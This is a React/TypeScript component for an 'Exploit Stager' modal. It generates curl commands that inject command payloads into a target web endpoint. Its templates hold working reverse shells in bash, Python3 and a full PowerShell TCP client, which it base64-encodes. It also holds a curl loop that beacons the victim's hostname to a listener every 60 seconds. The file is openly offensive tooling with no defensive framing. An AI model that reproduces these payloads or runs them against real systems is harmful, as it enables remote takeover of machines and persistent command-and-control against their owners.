import React, { useState } from 'react';
import { Button } from './Button.tsx';
import { Select } from './Select.tsx';
import { CheckIcon, CopyIcon } from './Icons.tsx';

interface ExploitStagerModalProps {
  isOpen: boolean;
  onClose: () => void;
}

const VULN_TYPES = [
    { value: 'rce', label: 'Remote Code Execution (RCE)' },
    { value: 'sqli', label: 'SQL Injection (SQLi)' },
    { value: 'lfi', label: 'Local File Inclusion (LFI)' },
    { value: 'other', label: 'Other' },
];

const PAYLOAD_TEMPLATES: Record<string, { label: string, template: string }> = {
    bash_reverse_shell: {
        label: "Bash Reverse Shell",
        template: "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"
    },
    python3_reverse_shell: {
        label: "Python3 Reverse Shell",
        template: "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{LHOST}\",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
    },
    powershell_reverse_shell: {
        label: "PowerShell Reverse Shell (Base64)",
        template: "powershell -nop -e {BASE64_PAYLOAD}"
    },
    curl_beacon: {
        label: "cURL Beacon (60s)",
        template: "while true; do curl http://{LHOST}:{LPORT}/beacon?id=$(hostname); sleep 60; done"
    },
};

type PayloadType = keyof typeof PAYLOAD_TEMPLATES;

const getPowerShellBase64Payload = (lhost: string, lport: string) => {
    const script = `$client = New-Object System.Net.Sockets.TCPClient('${lhost}',${lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
    
    // Create a UTF-16LE buffer and then Base64 encode it, which is what PowerShell's -e flag expects.
    let utf16leScript = '';
    for (let i = 0; i < script.length; i++) {
        utf16leScript += String.fromCharCode(script.charCodeAt(i) & 0xFF, (script.charCodeAt(i) >>> 8) & 0xFF);
    }
    return btoa(utf16leScript);
};


export const ExploitStagerModal: React.FC<ExploitStagerModalProps> = ({ isOpen, onClose }) => {
    const [targetEndpoint, setTargetEndpoint] = useState('');
    const [vulnType, setVulnType] = useState('rce');
    const [injectionPoint, setInjectionPoint] = useState('cmd');
    const [lhost, setLhost] = useState('10.10.10.10');
    const [lport, setLport] = useState('4444');
    const [payloadType, setPayloadType] = useState<PayloadType>('bash_reverse_shell');
    const [command, setCommand] = useState('');
    const [isCopied, setIsCopied] = useState(false);
    const [errors, setErrors] = useState({ targetEndpoint: '', lhost: '', lport: '', injectionPoint: '' });

    const validateInputs = () => {
        const newErrors = { targetEndpoint: '', lhost: '', lport: '', injectionPoint: '' };
        let isValid = true;
        
        if (!targetEndpoint || !targetEndpoint.startsWith('/')) {
            newErrors.targetEndpoint = 'Must be a valid path (e.g., /api/upload).';
            isValid = false;
        }
        
        if (!injectionPoint.trim()) {
            newErrors.injectionPoint = 'Parameter name cannot be empty.';
            isValid = false;
        }

        const ipHostnameRegex = /^([a-zA-Z0-9]+(-[a-zA-Z0-9]+)*\.)+[a-zA-Z]{2,}|(\d{1,3}\.){3}\d{1,3}$/;
        if (!lhost || !ipHostnameRegex.test(lhost)) {
            newErrors.lhost = 'Must be a valid IP address or hostname.';
            isValid = false;
        }
        
        const portNum = parseInt(lport, 10);
        if (isNaN(portNum) || portNum < 1 || portNum > 65535) {
            newErrors.lport = 'Must be a valid port number (1-65535).';
            isValid = false;
        }
        
        setErrors(newErrors);
        return isValid;
    };


    const handleGenerate = () => {
        if (!validateInputs()) {
            setCommand('');
            return;
        }
        setIsCopied(false); // Reset copy status on new generation

        let payloadToInject;
        const payloadTemplate = PAYLOAD_TEMPLATES[payloadType];

        if (payloadType === 'powershell_reverse_shell') {
            const base64Payload = getPowerShellBase64Payload(lhost, lport);
            // The payload to inject is the full command to be executed on the target
            payloadToInject = payloadTemplate.template.replace('{BASE64_PAYLOAD}', base64Payload);
        } else {
            payloadToInject = payloadTemplate.template
                .replace(/{LHOST}/g, lhost)
                .replace(/{LPORT}/g, lport);
        }
        
        const generatedCommand = `curl -X POST "https://{TARGET_HOST}${targetEndpoint}" --data-urlencode "${injectionPoint}=${payloadToInject}"`;
        setCommand(generatedCommand);
    };

    const handleCopy = () => {
        if (!command) return;
        navigator.clipboard.writeText(command).then(() => {
          setIsCopied(true);
          setTimeout(() => setIsCopied(false), 2500);
        });
    };

    if (!isOpen) return null;

    return (
        <div
          className="fixed inset-0 bg-black/90 backdrop-blur-md z-50 flex items-center justify-center p-4 transition-opacity duration-300 animate-fade-in"
          onClick={onClose}
          role="dialog"
          aria-modal="true"
          aria-labelledby="exploit-stager-title"
        >
          <div
            className="hud-container w-full max-w-2xl h-auto flex flex-col"
            onClick={e => e.stopPropagation()}
          >
            <div className="hud-corner corner-top-left"></div>
            <div className="hud-corner corner-top-right"></div>
            <div className="hud-corner corner-bottom-left"></div>
            <div className="hud-corner corner-bottom-right"></div>
            
            <div className="flex justify-between items-center flex-shrink-0 relative">
                <h2 id="exploit-stager-title" className="text-xl">Exploit Stager</h2>
                <button
                    onClick={onClose}
                    className="absolute -top-4 -right-4 p-1.5 rounded-full hover:bg-white/10 focus:outline-none focus:ring-1 focus:ring-[var(--hud-color)]"
                    aria-label="Close Exploit Stager"
                >
                    <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12" />
                    </svg>
                </button>
            </div>
    
            <div className="mt-4 flex flex-col min-h-0 space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div>
                      <label htmlFor="target-endpoint" className="block text-sm uppercase tracking-wider text-[var(--hud-color-darker)] mb-1">Target Endpoint</label>
                      <input id="target-endpoint" type="text" value={targetEndpoint} onChange={e => setTargetEndpoint(e.target.value)} className={`block w-full p-2.5 font-mono text-sm text-[var(--hud-color)] bg-black border ${errors.targetEndpoint ? 'border-[var(--red-color)]' : 'border-[var(--hud-color-darkest)]'} focus:outline-none focus:ring-1 focus:ring-[var(--hud-color)]`} placeholder="/api/v1/process" />
                      {errors.targetEndpoint && <p className="text-xs text-red-400 mt-1">{errors.targetEndpoint}</p>}
                  </div>
                  <div>
                      <label htmlFor="injection-point" className="block text-sm uppercase tracking-wider text-[var(--hud-color-darker)] mb-1">Injection Point (Parameter)</label>
                      <input id="injection-point" type="text" value={injectionPoint} onChange={e => setInjectionPoint(e.target.value)} className={`block w-full p-2.5 font-mono text-sm text-[var(--hud-color)] bg-black border ${errors.injectionPoint ? 'border-[var(--red-color)]' : 'border-[var(--hud-color-darkest)]'} focus:outline-none focus:ring-1 focus:ring-[var(--hud-color)]`} placeholder="cmd" />
                      {errors.injectionPoint && <p className="text-xs text-red-400 mt-1">{errors.injectionPoint}</p>}
                  </div>
              </div>
              <Select id="vuln-type" label="Vulnerability Type" options={VULN_TYPES} value={vulnType} onChange={setVulnType} />
               <Select id="payload-type" label="C2 Payload Template" options={Object.entries(PAYLOAD_TEMPLATES).map(([key, { label }]) => ({ value: key, label }))} value={payloadType} onChange={v => setPayloadType(v as PayloadType)} />
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div>
                      <label htmlFor="lhost" className="block text-sm uppercase tracking-wider text-[var(--hud-color-darker)] mb-1">Listener IP (LHOST)</label>
                      <input id="lhost" type="text" value={lhost} onChange={e => setLhost(e.target.value)} className={`block w-full p-2.5 font-mono text-sm text-[var(--hud-color)] bg-black border ${errors.lhost ? 'border-[var(--red-color)]' : 'border-[var(--hud-color-darkest)]'} focus:outline-none focus:ring-1 focus:ring-[var(--hud-color)]`} placeholder="10.10.10.10" />
                      {errors.lhost && <p className="text-xs text-red-400 mt-1">{errors.lhost}</p>}
                  </div>
                  <div>
                      <label htmlFor="lport" className="block text-sm uppercase tracking-wider text-[var(--hud-color-darker)] mb-1">Listener Port (LPORT)</label>
                      <input id="lport" type="text" value={lport} onChange={e => setLport(e.target.value)} className={`block w-full p-2.5 font-mono text-sm text-[var(--hud-color)] bg-black border ${errors.lport ? 'border-[var(--red-color)]' : 'border-[var(--hud-color-darkest)]'} focus:outline-none focus:ring-1 focus:ring-[var(--hud-color)]`} placeholder="4444" />
                      {errors.lport && <p className="text-xs text-red-400 mt-1">{errors.lport}</p>}
                  </div>
              </div>
              
              <Button onClick={handleGenerate} disabled={!targetEndpoint || !lhost || !lport}>
                [ Stage C2 Payload ]
              </Button>
    
              {command && (
                <div className="animate-fade-in space-y-2">
                    <h4 className="text-sm uppercase tracking-wider text-[var(--hud-color-darker)]">Generated Command:</h4>
                    <div className="relative">
                        <textarea
                            readOnly
                            value={command}
                            className="block w-full h-24 p-3 font-mono text-xs text-[var(--hud-color)] bg-black border border-[var(--hud-color-darkest)] resize-y pr-12"
                            aria-label="Generated exploit command"
                        />
                        <button
                            onClick={handleCopy}
                            className="absolute top-2 right-2 p-1.5 bg-black/50 text-[var(--hud-color)] hover:bg-[var(--hud-color)] hover:text-black"
                            title={isCopied ? "Copied!" : "Copy Command"}
                            aria-label={isCopied ? "Command copied" : "Copy generated command"}
                        >
                            {isCopied ? <CheckIcon className="w-4 h-4" /> : <CopyIcon className="w-4 h-4" />}
                        </button>
                    </div>
                     <p className="text-xs text-center text-[var(--hud-color-darker)]">NOTE: Replace `{'{TARGET_HOST}'}` with the target's actual hostname or IP.</p>
                </div>
              )}
            </div>
          </div>
        </div>
      );
};